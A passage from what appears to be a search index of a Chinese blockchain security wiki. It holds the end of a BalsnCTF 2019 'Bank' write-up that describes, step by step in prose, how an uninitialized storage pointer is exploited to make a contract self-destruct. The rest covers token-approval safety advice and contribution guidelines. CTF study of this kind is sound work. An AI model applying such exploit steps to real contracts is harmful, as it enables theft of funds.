0x111111111111110000070f00\uff0c\u7531\u4e8e\u4e0a\u4e00\u6b65\u6211\u4eec\u8bbe\u7f6e\u4e86 safeboxes[0].callback = sendEther\uff0c\u90a3\u4e48\u8fd9\u4e00\u6b65\u4fbf\u4f1a\u8c03\u7528 sendEther \u51fd\u6570\uff0c\u8fdb\u800c\u8d70\u5230 onlyPass \u4e2d\u7684 if \u5206\u652f\u4e2d\uff0c\u4f7f\u5f97 failedLogs[msg.sender][0] \u4e2d\u7684 triedPass \u88ab\u4fee\u6539\u4e3a\u4e86\u6211\u4eec\u4f20\u5165\u7684 pass \u503c\uff0c\u540c\u65f6\u8fd9\u6b65\u64cd\u4f5c\u4e5f\u4fee\u6539\u4e86 safeboxes.length \u4e3a msg.sender | pass\u3002 \u8c03\u7528 withdraw \u51fd\u6570\uff0c\u8bbe\u7f6e\u4f20\u5165\u7684 idx \u503c\u4e3a\u6211\u4eec\u5728\u7b2c\u56db\u6b65\u4e2d\u6240\u8ba1\u7b97\u51fa\u7684 idx \u503c\uff0cpass \u503c\u4e3a 0x000000000000000000000000\uff0c\u90a3\u4e48\u7a0b\u5e8f\u6267\u884c\u6d41\u4fbf\u4f1a\u8df3\u8f6c\u5230 emit SendFlag(msg.sender) \u7ee7\u7eed\u6267\u884c\uff0c\u6700\u7ec8\u76ee\u6807\u5408\u7ea6\u4f1a\u81ea\u6bc1\uff0c\u653b\u51fb\u6210\u529f\u3002 Note \u6ce8\uff1a\u653b\u51fb\u6b65\u9aa4\u4e2d\u7684 slot \u8ba1\u7b97\u89c4\u5219\u53ef\u4ee5\u5728 Ethereum Storage \u8282\u4e2d\u67e5\u770b\u3002","title":"2019 BalsnCTF Bank"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#_4","text":"","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#balsn-2019","text":"\u9898\u76ee\u540d\u79f0 Bank","title":"Balsn 2019"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#rctf-2020","text":"\u9898\u76ee\u540d\u79f0 roiscoin","title":"RCTF 2020"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#byte-2019","text":"\u9898\u76ee\u540d\u79f0 hf","title":"Byte 2019"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#2019","text":"\u9898\u76ee\u540d\u79f0 cow \u9898\u76ee\u540d\u79f0 rise Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"\u6570\u5b57\u7ecf\u6d4e\u5927\u8d5b 2019"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#_5","text":"\u4ee5\u592a\u574a Solidity \u672a\u521d\u59cb\u5316\u5b58\u50a8\u6307\u9488\u5b89\u5168\u98ce\u9669\u6d45\u6790 Balsn CTF 2019 - Bank","title":"\u53c2\u8003"},{"location":"blockchain/publicblockchain/approve/","text":"\u6388\u6743\u5b89\u5168 \u00b6 \u4ec0\u4e48\u662f\u6388\u6743Aprrove \u00b6 \u6388\u6743(Approve)\uff0c\u5c31\u662f\u5141\u8bb8\u53e6\u5916\u4e00\u4e2a\u94b1\u5305\uff08\u53ef\u4ee5\u662f\u666e\u901a\u7684\u4e2a\u4eba\u94b1\u5305\uff0c\u4e5f\u53ef\u4ee5\u662f\u667a\u80fd\u5408\u7ea6\u94b1\u5305\uff09\uff0c\u5728\u9664Approve\u64cd\u4f5c\u5916\uff0c\u4e0d\u901a\u77e5\u4f60\u7684\u524d\u63d0\u4e0b\uff0c\u4f7f\u7528\u4f60\u7684\u90e8\u5206\u8d44\u4ea7\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u6388\u6743Approve\u64cd\u4f5c \u00b6 \u7528Conflux\u7f51\u7edc\u4e3e\u4f8b\uff0c\u7531\u4e8eCFX\u662f\u539f\u751f\u8d44\u4ea7\uff0c\u5728\u5411\u76ee\u6807\u667a\u80fd\u5408\u7ea6\u8f6c\u8d26\u6216\u4ea4\u4e92\u7684\u65f6\u5019\uff0c\u672c\u8eab\u4f1a\u643a\u5e26CFX\u8d44\u4ea7\u5230\u76ee\u6807\u5408\u7ea6\u4e2d\uff1b\u800c\u975e\u539f\u751f\u8d44\u4ea7CRC20\u4ee3\u5e01\u5728\u5411\u76ee\u6807\u5408\u7ea6\u8f6c\u8d26\u65f6\uff0c\u53ea\u662f\u66f4\u6539CRC20\u4ee3\u5e01\u5408\u7ea6\u672c\u8eab\u7684\u8d26\u672c\u4fe1\u606f\uff0c\u7528\u6237\u5b9e\u9645\u4ea4\u4e92\u7684\u76ee\u6807\u5408\u7ea6\u4e0d\u4f1a\u6536\u5230\u4efb\u4f55\u901a\u77e5\uff0c\u56e0\u6b64approve\u64cd\u4f5c\u662f\u544a\u77e5CRC20\u4ee3\u5e01\u5408\u7ea6\uff0c\u5c06\u6765\u67d0\u6388\u6743\u94b1\u5305\u6216\u5408\u7ea6\u5730\u5740\u53ef\u4ee5\u5212\u8f6c\u53d1\u8d77\u6388\u6743\u4ea4\u6613\u8d26\u6237\u7684\u8d44\u4ea7\u3002 \u54ea\u4e9b\u573a\u666f\u53ef\u80fd\u4f1a\u9700\u8981\u6388\u6743\u64cd\u4f5c \u00b6 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u53ea\u6709\u6d89\u53ca\u5230\u548c\u5408\u7ea6\u4ea4\u4e92\uff08DApp\u3001DeFi\u7b49\uff09\uff0c\u9700\u8981\u5bf9\u5408\u7ea6\u8fdb\u884c\u6388\u6743\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u8fdb\u884c\u6388\u6743\uff08Approve\uff09\u64cd\u4f5c\u3002\u4f8b\u5982\u4f7f\u7528fc\u53c2\u4e0eIns3\u627f\u4fdd\uff0cflux\u5b58\u6b3e\uff0ckoichiswap\u6362\u51faFC\u4e70\u5165cfx\u65f6\uff0c\u9700\u8981\u8c03\u7528FC\u7684\u667a\u80fd\u5408\u7ea6\u6388\u6743Ins3\uff0cflux\u53cakoichiswap\u9879\u76ee\u7684\u5408\u7ea6\u5730\u5740\u53ef\u5212\u8f6c\u7528\u6237\u94b1\u5305\u4e2d\u7684fc\u4ee3\u5e01\u3002 \u6240\u4ee5\uff0c\u5f53\u4f60\u5728\u4f7f\u7528Portal\u7684\u8fc7\u7a0b\u4e2d\uff0c\u51fa\u73b0\u4ee5\u4e0b\u754c\u9762\u7684\u65f6\u5019\uff0c\u5c31\u662f\u5728\u5411\u4f60\u8be2\u95ee\u6388\u6743\uff08Approve\uff09\u64cd\u4f5c\uff0c\u90a3\u5c31\u4e00\u5b9a\u8981\u591a\u52a0\u5c0f\u5fc3\uff0c\u591a\u6b21\u786e\u8ba4\u5f53\u524d\u4f60\u8bbf\u95ee\u7684\u94fe\u63a5\u662f\u5426\u662f\u5b89\u5168\u3001\u53ef\u4fe1\u7684\uff0c\u624d\u53ef\u4ee5\u7ee7\u7eed\u64cd\u4f5c\uff01 \u7528\u6237\u53ef\u901a\u8fc7\u70b9\u51fbPortal\u4e2d\u7684\u201cEdit Permission\u201d\u4fee\u6539\u6388\u6743\u989d\u5ea6 Warning \u6388\u6743\uff08Approve\uff09\uff0c\u662f\u5141\u8bb8\u7b2c\u4e09\u65b9\u5728\u4e0d\u901a\u77e5\u4f60\u7684\u524d\u63d0\u4e0b\uff0c\u5212\u8f6c\u4f60\u7684\u8d44\u4ea7\u3002\u5f80\u6700\u4e25\u91cd\u7684\u60c5\u51b5\u8bf4\uff0c\u5c31\u662f\u5bf9\u65b9\u5728\u4f60\u4e0d\u77e5\u9053\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u628a\u4f60\u7684\u67d0\u4e2a\u8d44\u4ea7\u5168\u90e8\u8f6c\u8d70\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4f60\u7ed9\u4e00\u4e9b\u4e0d\u660e\u6765\u5386\u7684\u7b2c\u4e09\u65b9\u5e94\u7528\u8fdb\u884c\u6388\u6743\uff0c\u662f\u5b58\u5728\u7740\u5de8\u5927\u7684\u5b89\u5168\u9690\u60a3\u7684\uff01 \u6240\u4ee5\uff0c\u9047\u5230\u6388\u6743\uff08Approve\uff09\u7684\u65f6\u5019\uff0c\u4e00\u5b9a\u8981\u5c0f\u5fc3\uff01\u4e00\u5b9a\u8981\u786e\u5b9a\u5bf9\u65b9\u4ee3\u7801\u662f\u5426\u5f00\u6e90\uff0c\u5bf9\u65b9\u662f\u5426\u6709\u505a\u4ee3\u7801\u5ba1\u8ba1\uff0c\u5bf9\u65b9\u56e2\u961f\u662f\u5426\u662f\u53ef\u4fe1\u4efb\u7684\u7b49\u7b49\uff01\u5728\u6388\u6743\u524d\u8bf7\u786e\u8ba4\u60a8\u662f\u5426\u80fd\u4fe1\u4efb\u5bf9\u5e94\u5408\u7ea6\u7684\u5f00\u53d1\u8005\uff0c\u5982\u65e0\u6cd5\u4fe1\u4efb\uff0c\u8bf7\u4e00\u5b9a\u70b9\u51fbReject\uff01","title":"\u6388\u6743\u5b89\u5168"},{"location":"blockchain/publicblockchain/approve/#_1","text":"","title":"\u6388\u6743\u5b89\u5168"},{"location":"blockchain/publicblockchain/approve/#aprrove","text":"\u6388\u6743(Approve)\uff0c\u5c31\u662f\u5141\u8bb8\u53e6\u5916\u4e00\u4e2a\u94b1\u5305\uff08\u53ef\u4ee5\u662f\u666e\u901a\u7684\u4e2a\u4eba\u94b1\u5305\uff0c\u4e5f\u53ef\u4ee5\u662f\u667a\u80fd\u5408\u7ea6\u94b1\u5305\uff09\uff0c\u5728\u9664Approve\u64cd\u4f5c\u5916\uff0c\u4e0d\u901a\u77e5\u4f60\u7684\u524d\u63d0\u4e0b\uff0c\u4f7f\u7528\u4f60\u7684\u90e8\u5206\u8d44\u4ea7\u3002","title":"\u4ec0\u4e48\u662f\u6388\u6743Aprrove"},{"location":"blockchain/publicblockchain/approve/#approve","text":"\u7528Conflux\u7f51\u7edc\u4e3e\u4f8b\uff0c\u7531\u4e8eCFX\u662f\u539f\u751f\u8d44\u4ea7\uff0c\u5728\u5411\u76ee\u6807\u667a\u80fd\u5408\u7ea6\u8f6c\u8d26\u6216\u4ea4\u4e92\u7684\u65f6\u5019\uff0c\u672c\u8eab\u4f1a\u643a\u5e26CFX\u8d44\u4ea7\u5230\u76ee\u6807\u5408\u7ea6\u4e2d\uff1b\u800c\u975e\u539f\u751f\u8d44\u4ea7CRC20\u4ee3\u5e01\u5728\u5411\u76ee\u6807\u5408\u7ea6\u8f6c\u8d26\u65f6\uff0c\u53ea\u662f\u66f4\u6539CRC20\u4ee3\u5e01\u5408\u7ea6\u672c\u8eab\u7684\u8d26\u672c\u4fe1\u606f\uff0c\u7528\u6237\u5b9e\u9645\u4ea4\u4e92\u7684\u76ee\u6807\u5408\u7ea6\u4e0d\u4f1a\u6536\u5230\u4efb\u4f55\u901a\u77e5\uff0c\u56e0\u6b64approve\u64cd\u4f5c\u662f\u544a\u77e5CRC20\u4ee3\u5e01\u5408\u7ea6\uff0c\u5c06\u6765\u67d0\u6388\u6743\u94b1\u5305\u6216\u5408\u7ea6\u5730\u5740\u53ef\u4ee5\u5212\u8f6c\u53d1\u8d77\u6388\u6743\u4ea4\u6613\u8d26\u6237\u7684\u8d44\u4ea7\u3002","title":"\u4e3a\u4ec0\u4e48\u9700\u8981\u6388\u6743Approve\u64cd\u4f5c"},{"location":"blockchain/publicblockchain/approve/#_2","text":"\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u53ea\u6709\u6d89\u53ca\u5230\u548c\u5408\u7ea6\u4ea4\u4e92\uff08DApp\u3001DeFi\u7b49\uff09\uff0c\u9700\u8981\u5bf9\u5408\u7ea6\u8fdb\u884c\u6388\u6743\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u8fdb\u884c\u6388\u6743\uff08Approve\uff09\u64cd\u4f5c\u3002\u4f8b\u5982\u4f7f\u7528fc\u53c2\u4e0eIns3\u627f\u4fdd\uff0cflux\u5b58\u6b3e\uff0ckoichiswap\u6362\u51faFC\u4e70\u5165cfx\u65f6\uff0c\u9700\u8981\u8c03\u7528FC\u7684\u667a\u80fd\u5408\u7ea6\u6388\u6743Ins3\uff0cflux\u53cakoichiswap\u9879\u76ee\u7684\u5408\u7ea6\u5730\u5740\u53ef\u5212\u8f6c\u7528\u6237\u94b1\u5305\u4e2d\u7684fc\u4ee3\u5e01\u3002 \u6240\u4ee5\uff0c\u5f53\u4f60\u5728\u4f7f\u7528Portal\u7684\u8fc7\u7a0b\u4e2d\uff0c\u51fa\u73b0\u4ee5\u4e0b\u754c\u9762\u7684\u65f6\u5019\uff0c\u5c31\u662f\u5728\u5411\u4f60\u8be2\u95ee\u6388\u6743\uff08Approve\uff09\u64cd\u4f5c\uff0c\u90a3\u5c31\u4e00\u5b9a\u8981\u591a\u52a0\u5c0f\u5fc3\uff0c\u591a\u6b21\u786e\u8ba4\u5f53\u524d\u4f60\u8bbf\u95ee\u7684\u94fe\u63a5\u662f\u5426\u662f\u5b89\u5168\u3001\u53ef\u4fe1\u7684\uff0c\u624d\u53ef\u4ee5\u7ee7\u7eed\u64cd\u4f5c\uff01 \u7528\u6237\u53ef\u901a\u8fc7\u70b9\u51fbPortal\u4e2d\u7684\u201cEdit Permission\u201d\u4fee\u6539\u6388\u6743\u989d\u5ea6 Warning \u6388\u6743\uff08Approve\uff09\uff0c\u662f\u5141\u8bb8\u7b2c\u4e09\u65b9\u5728\u4e0d\u901a\u77e5\u4f60\u7684\u524d\u63d0\u4e0b\uff0c\u5212\u8f6c\u4f60\u7684\u8d44\u4ea7\u3002\u5f80\u6700\u4e25\u91cd\u7684\u60c5\u51b5\u8bf4\uff0c\u5c31\u662f\u5bf9\u65b9\u5728\u4f60\u4e0d\u77e5\u9053\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u628a\u4f60\u7684\u67d0\u4e2a\u8d44\u4ea7\u5168\u90e8\u8f6c\u8d70\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4f60\u7ed9\u4e00\u4e9b\u4e0d\u660e\u6765\u5386\u7684\u7b2c\u4e09\u65b9\u5e94\u7528\u8fdb\u884c\u6388\u6743\uff0c\u662f\u5b58\u5728\u7740\u5de8\u5927\u7684\u5b89\u5168\u9690\u60a3\u7684\uff01 \u6240\u4ee5\uff0c\u9047\u5230\u6388\u6743\uff08Approve\uff09\u7684\u65f6\u5019\uff0c\u4e00\u5b9a\u8981\u5c0f\u5fc3\uff01\u4e00\u5b9a\u8981\u786e\u5b9a\u5bf9\u65b9\u4ee3\u7801\u662f\u5426\u5f00\u6e90\uff0c\u5bf9\u65b9\u662f\u5426\u6709\u505a\u4ee3\u7801\u5ba1\u8ba1\uff0c\u5bf9\u65b9\u56e2\u961f\u662f\u5426\u662f\u53ef\u4fe1\u4efb\u7684\u7b49\u7b49\uff01\u5728\u6388\u6743\u524d\u8bf7\u786e\u8ba4\u60a8\u662f\u5426\u80fd\u4fe1\u4efb\u5bf9\u5e94\u5408\u7ea6\u7684\u5f00\u53d1\u8005\uff0c\u5982\u65e0\u6cd5\u4fe1\u4efb\uff0c\u8bf7\u4e00\u5b9a\u70b9\u51fbReject\uff01","title":"\u54ea\u4e9b\u573a\u666f\u53ef\u80fd\u4f1a\u9700\u8981\u6388\u6743\u64cd\u4f5c"},{"location":"blockchain/publicblockchain/introduction/","text":"Public Blockchain Security Overview \u00b6 \u5f85\u8865\u5145","title":"Public Blockchain Security Overview"},{"location":"blockchain/publicblockchain/introduction/#public-blockchain-security-overview","text":"\u5f85\u8865\u5145","title":"Public Blockchain Security Overview"},{"location":"contribute/basic-contribute-approach/","text":"\u57fa\u672c\u8d21\u732e\u65b9\u5f0f \u00b6 \u6211\u4e4b\u524d\u6ca1\u600e\u4e48\u7528\u8fc7 Github \u00b6 \u53c2\u4e0e Wiki \u7684\u7f16\u5199 \u9700\u8981 \u4e00\u4e2a Github \u8d26\u53f7\uff0c \u4e0d\u9700\u8981 \u9ad8\u8d85\u7684 Github \u6280\u5de7\u3002 \u4e3e\u4e2a\u6817\u5b50\uff0c\u5047\u5982\u6211\u60f3\u8981\u4fee\u6539\u4e00\u4e2a\u9875\u9762\u5185\u5bb9\uff0c\u5e94\u8be5\u600e\u4e48\u64cd\u4f5c\u5462\uff1f \u5728 Conflux Wiki \u4e0a\u627e\u5230\u5bf9\u5e94\u9875\u9762 \u70b9\u51fb \u6b63\u6587\u53f3\u4e0a\u65b9\u3001\u76ee\u5f55\u5de6\u4fa7\u7684 \u201c\u7f16\u8f91\u6b64\u9875\u201d \u6309\u94ae \uff08\u5e94\u8be5\u5df2\u7ecf\u8df3\u8f6c\u5230\u4e86 Github \u4e0a\u7684\u5bf9\u5e94\u9875\u9762\u5427\uff1f\uff09\u8fd9\u65f6\u5019\u53f3\u4e0a\u65b9\u8fd8\u4f1a\u6709\u4e00\u4e2a \u201c\u7f16\u8f91\u6b64\u9875\u201d \u7684\u6309\u94ae\uff0c\u70b9\u51fb\u5b83\u5c31\u53ef\u4ee5\u5728\u7ebf\u7f16\u8f91\u4e86 \u5199\u597d\u4e86\u4e4b\u540e\u70b9\u4e0b\u65b9\u7684\u7eff\u8272\u6309\u94ae\uff0c\u53ef\u80fd\u4f1a\u63d0\u793a\u6ca1\u6709\u6743\u9650\u3002\u4e0d\u5fc5\u62c5\u5fc3\uff01Github \u4f1a\u81ea\u52a8\u5e2e\u4f60 fork \u4e00\u4efd\u9879\u76ee\u7684\u6587\u4ef6\u5e76\u521b\u5efa Pull Request \uff08\u6709\u6728\u6709\u5f88\u7b80\u5355\uff1f\uff09 \u5982\u679c\u8fd8\u662f\u4e0d\u653e\u5fc3\uff0c\u53ef\u4ee5\u53c2\u8003\u4ee5\u4e0b\u8d44\u6599\uff1a https://guides.github.com/activities/hello-world/ https://guides.github.com/activities/forking/ \u6211\u4e4b\u524d\u7528\u8fc7 Github \u00b6 \u57fa\u672c\u534f\u4f5c\u65b9\u5f0f\u5982\u4e0b Fork \u4e3b\u4ed3\u5e93\u5230\u81ea\u5df1\u7684\u4ed3\u5e93\u4e2d\u3002 \u5f53\u60f3\u8981\u8d21\u732e\u67d0\u90e8\u5206\u5185\u5bb9\u65f6\uff0c\u8bf7\u52a1\u5fc5\u4ed4\u7ec6\u67e5\u770b Issue \u4e0e Project \uff0c\u4ee5\u4fbf\u786e\u5b9a\u662f\u5426\u6709\u4eba\u5df2\u7ecf\u5f00\u59cb\u4e86\u8fd9\u9879\u5de5\u4f5c\u3002\u5f53\u7136\uff0c\u6211\u4eec\u66f4\u5e0c\u671b\u4f60\u53ef\u4ee5\u52a0\u5165 \u7535\u62a5 \uff0c\u4ee5\u4fbf\u4e8e\u6c9f\u901a\u4e0e\u4ea4\u6d41\u3002 \u5728\u51b3\u5b9a\u5c06\u5185\u5bb9\u63a8\u9001\u5230\u672c\u4ed3\u5e93\u65f6\uff0c \u8bf7\u4f60\u9996\u5148\u62c9\u53d6\u672c\u4ed3\u5e93\u4ee3\u7801\u8fdb\u884c\u5408\u5e76\uff0c\u81ea\u884c\u5904\u7406\u597d\u51b2\u7a81\uff0c\u540c\u65f6\u786e\u4fdd\u5728\u672c\u5730\u53ef\u4ee5\u6b63\u5e38\u751f\u6210\u6587\u6863 \uff0c\u7136\u540e\u518d PR \u5230\u4e3b\u4ed3\u5e93\u7684 master \u5206\u652f\u4e0a\u3002\u5176\u4e2d\uff0cPR \u9700\u8981\u5305\u542b\u4ee5\u4e0b\u57fa\u672c\u4fe1\u606f \u6807\u9898\uff1a\u672c\u6b21 PR \u7684\u76ee\u7684\uff08\u505a\u4e86\u4ec0\u4e48\u5de5\u4f5c\uff0c\u4fee\u590d\u4e86\u4ec0\u4e48\u95ee\u9898\uff09 \u5185\u5bb9\uff1a\u5982\u679c\u5fc5\u8981\u7684\u8bdd\uff0c\u8bf7\u7ed9\u51fa\u5bf9\u4fee\u590d\u95ee\u9898\u7684\u53d9\u8ff0 \u6ce8\u610f\uff0c\u6240\u6709\u7684\u5185\u5bb9\u90fd\u5e94\u8be5\u4f7f\u7528\u82f1\u8bed \u5982\u679c\u53d1\u73b0 PR \u4e2d\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u8bf7\u5728 PR \u4e2d\u76f4\u63a5\u8bc4\u8bba\uff0c\u5e76\u5c3d\u91cf\u7ed9\u51fa\u4fee\u6b63\u7684\u65b9\u5f0f\uff0c\u6216\u8005\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u4fee\u6539\u3002 \u63d0\u51fa\u8be5 PR \u7684\u4eba\u6839\u636e\u8bc4\u8bba\u4fee\u6b63\u5185\u5bb9\uff0c\u7136\u540e\u5c06\u4fee\u6539\u540e\u7684\u5185\u5bb9 Merge \u5230 master \u5206\u652f\u4e2d\u3002 \u76ee\u524d\uff0c\u5728\u4eba\u5458\u8f83\u5c11\u7684\u524d\u63d0\u4e0b\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5ffd\u7565 4-5 \u6b65\u3002 \u6ce8\u610f \u00b6 \u6bcf\u6b21 Pull Request \u5e94\u53ea\u89e3\u51b3\u4e00\u4e2a\u4e3b\u8981\u7684\u4e8b\u60c5\uff0c\u8fd9\u6837\u65b9\u4fbf\u4e8e\u8fdb\u884c\u4fee\u6539\u3002 \u5728\u6bcf\u6b21 Pull Request \u65f6\uff0c\u8bf7\u786e\u4fdd\u81ea\u5df1\u5728\u672c\u5730\u751f\u6210\u65f6\uff0c\u53ef\u4ee5\u6b63\u786e\u663e\u793a\uff0c\u5e76\u5728 Pull Request \u9875\u9762\u7684\u8bc4\u8bba\u4e2d\u67e5\u770b\u9884\u89c8\u7684\u7ad9\u70b9\u662f\u5426\u4e3a\u81ea\u5df1\u671f\u671b\u7684\u6837\u5b50\u3002 \u5982\u679c\u4f60\u60f3\u8981\u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u7ae0\u8282\uff0c\u5373\u7f16\u5199\u76ee\u524d Conflux Wiki \u4e2d\u6ca1\u6709\u7684\u5185\u5bb9\uff0c\u8bf7\u52a1\u5fc5\u52a0\u5165 \u7535\u62a5 \u4e2d\u4ea4\u6d41\uff0c\u5e76\u5728\u4ea4\u6d41\u5b8c\u6bd5\u540e \u5c06\u81ea\u5df1\u60f3\u8981\u5f00\u542f\u7684\u65b0\u7684\u7ae0\u8282\u4ee5\u7b80\u660e\u627c\u8981\u7684\u65b9\u5f0f\u53d1\u8d77\u4e00\u4e2a\u65b0\u7684 issue \uff0c\u4ee5\u4fbf\u4e8e\u7ba1\u7406\u4eba\u5458\u628a\u8fd9\u4e2a\u653e\u5230\u5bf9\u5e94 Project \u7684 In Process \u680f\u4e2d\u3002 \u5728\u4f60\u6210\u4e3a\u56e2\u961f\u6210\u5458\u540e\uff0c\u4f60\u53ef\u4ee5\u81ea\u7531\u5730\u7f16\u5199 Project \u4e2d\u7684\u5185\u5bb9\u3002","title":"\u57fa\u672c\u8d21\u732e\u65b9\u5f0f"},{"location":"contribute/basic-contribute-approach/#_1","text":"","title":"\u57fa\u672c\u8d21\u732e\u65b9\u5f0f"},{"location":"contribute/basic-contribute-approach/#github","text":"\u53c2\u4e0e Wiki \u7684\u7f16\u5199 \u9700\u8981 \u4e00\u4e2a Github \u8d26\u53f7\uff0c \u4e0d\u9700\u8981 \u9ad8\u8d85\u7684 Github \u6280\u5de7\u3002 \u4e3e\u4e2a\u6817\u5b50\uff0c\u5047\u5982\u6211\u60f3\u8981\u4fee\u6539\u4e00\u4e2a\u9875\u9762\u5185\u5bb9\uff0c\u5e94\u8be5\u600e\u4e48\u64cd\u4f5c\u5462\uff1f \u5728 Conflux Wiki \u4e0a\u627e\u5230\u5bf9\u5e94\u9875\u9762 \u70b9\u51fb \u6b63\u6587\u53f3\u4e0a\u65b9\u3001\u76ee\u5f55\u5de6\u4fa7\u7684 \u201c\u7f16\u8f91\u6b64\u9875\u201d \u6309\u94ae \uff08\u5e94\u8be5\u5df2\u7ecf\u8df3\u8f6c\u5230\u4e86 Github \u4e0a\u7684\u5bf9\u5e94\u9875\u9762\u5427\uff1f\uff09\u8fd9\u65f6\u5019\u53f3\u4e0a\u65b9\u8fd8\u4f1a\u6709\u4e00\u4e2a \u201c\u7f16\u8f91\u6b64\u9875\u201d \u7684\u6309\u94ae\uff0c\u70b9\u51fb\u5b83\u5c31\u53ef\u4ee5\u5728\u7ebf\u7f16\u8f91\u4e86 \u5199\u597d\u4e86\u4e4b\u540e\u70b9\u4e0b\u65b9\u7684\u7eff\u8272\u6309\u94ae\uff0c\u53ef\u80fd\u4f1a\u63d0\u793a\u6ca1\u6709\u6743\u9650\u3002\u4e0d\u5fc5\u62c5\u5fc3\uff01Github \u4f1a\u81ea\u52a8\u5e2e\u4f60 fork \u4e00\u4efd\u9879\u76ee\u7684\u6587\u4ef6\u5e76\u521b\u5efa Pull Request \uff08\u6709\u6728\u6709\u5f88\u7b80\u5355\uff1f\uff09 \u5982\u679c\u8fd8\u662f\u4e0d\u653e\u5fc3\uff0c\u53ef\u4ee5\u53c2\u8003\u4ee5\u4e0b\u8d44\u6599\uff1a https://guides.github.com/activities/hello-world/ https://guides.github.com/activities/forking/","title":"\u6211\u4e4b\u524d\u6ca1\u600e\u4e48\u7528\u8fc7 Github"},{"location":"contribute/basic-contribute-approach/#github_1","text":"\u57fa\u672c\u534f\u4f5c\u65b9\u5f0f\u5982\u4e0b Fork \u4e3b\u4ed3\u5e93\u5230\u81ea\u5df1\u7684\u4ed3\u5e93\u4e2d\u3002 \u5f53\u60f3\u8981\u8d21\u732e\u67d0\u90e8\u5206\u5185\u5bb9\u65f6\uff0c\u8bf7\u52a1\u5fc5\u4ed4\u7ec6\u67e5\u770b Issue \u4e0e Project \uff0c\u4ee5\u4fbf\u786e\u5b9a\u662f\u5426\u6709\u4eba\u5df2\u7ecf\u5f00\u59cb\u4e86\u8fd9\u9879\u5de5\u4f5c\u3002\u5f53\u7136\uff0c\u6211\u4eec\u66f4\u5e0c\u671b\u4f60\u53ef\u4ee5\u52a0\u5165 \u7535\u62a5 \uff0c\u4ee5\u4fbf\u4e8e\u6c9f\u901a\u4e0e\u4ea4\u6d41\u3002 \u5728\u51b3\u5b9a\u5c06\u5185\u5bb9\u63a8\u9001\u5230\u672c\u4ed3\u5e93\u65f6\uff0c \u8bf7\u4f60\u9996\u5148\u62c9\u53d6\u672c\u4ed3\u5e93\u4ee3\u7801\u8fdb\u884c\u5408\u5e76\uff0c\u81ea\u884c\u5904\u7406\u597d\u51b2\u7a81\uff0c\u540c\u65f6\u786e\u4fdd\u5728\u672c\u5730\u53ef\u4ee5\u6b63\u5e38\u751f\u6210\u6587\u6863 \uff0c\u7136\u540e\u518d PR \u5230\u4e3b\u4ed3\u5e93\u7684 master \u5206\u652f\u4e0a\u3002\u5176\u4e2d\uff0cPR \u9700\u8981\u5305\u542b\u4ee5\u4e0b\u57fa\u672c\u4fe1\u606f \u6807\u9898\uff1a\u672c\u6b21 PR \u7684\u76ee\u7684\uff08\u505a\u4e86\u4ec0\u4e48\u5de5\u4f5c\uff0c\u4fee\u590d\u4e86\u4ec0\u4e48\u95ee\u9898\uff09 \u5185\u5bb9\uff1a\u5982\u679c\u5fc5\u8981\u7684\u8bdd\uff0c\u8bf7\u7ed9\u51fa\u5bf9\u4fee\u590d\u95ee\u9898\u7684\u53d9\u8ff0 \u6ce8\u610f\uff0c\u6240\u6709\u7684\u5185\u5bb9\u90fd\u5e94\u8be5\u4f7f\u7528\u82f1\u8bed \u5982\u679c\u53d1\u73b0 PR \u4e2d\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u8bf7\u5728 PR \u4e2d\u76f4\u63a5\u8bc4\u8bba\uff0c\u5e76\u5c3d\u91cf\u7ed9\u51fa\u4fee\u6b63\u7684\u65b9\u5f0f\uff0c\u6216\u8005\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u4fee\u6539\u3002 \u63d0\u51fa\u8be5 PR \u7684\u4eba\u6839\u636e\u8bc4\u8bba\u4fee\u6b63\u5185\u5bb9\uff0c\u7136\u540e\u5c06\u4fee\u6539\u540e\u7684\u5185\u5bb9 Merge \u5230 master \u5206\u652f\u4e2d\u3002 \u76ee\u524d\uff0c\u5728\u4eba\u5458\u8f83\u5c11\u7684\u524d\u63d0\u4e0b\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5ffd\u7565 4-5 \u6b65\u3002","title":"\u6211\u4e4b\u524d\u7528\u8fc7 Github"},{"location":"contribute/basic-contribute-approach/#_2","text":"\u6bcf\u6b21 Pull Request \u5e94\u53ea\u89e3\u51b3\u4e00\u4e2a\u4e3b\u8981\u7684\u4e8b\u60c5\uff0c\u8fd9\u6837\u65b9\u4fbf\u4e8e\u8fdb\u884c\u4fee\u6539\u3002 \u5728\u6bcf\u6b21 Pull Request \u65f6\uff0c\u8bf7\u786e\u4fdd\u81ea\u5df1\u5728\u672c\u5730\u751f\u6210\u65f6\uff0c\u53ef\u4ee5\u6b63\u786e\u663e\u793a\uff0c\u5e76\u5728 Pull Request \u9875\u9762\u7684\u8bc4\u8bba\u4e2d\u67e5\u770b\u9884\u89c8\u7684\u7ad9\u70b9\u662f\u5426\u4e3a\u81ea\u5df1\u671f\u671b\u7684\u6837\u5b50\u3002 \u5982\u679c\u4f60\u60f3\u8981\u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u7ae0\u8282\uff0c\u5373\u7f16\u5199\u76ee\u524d Conflux Wiki 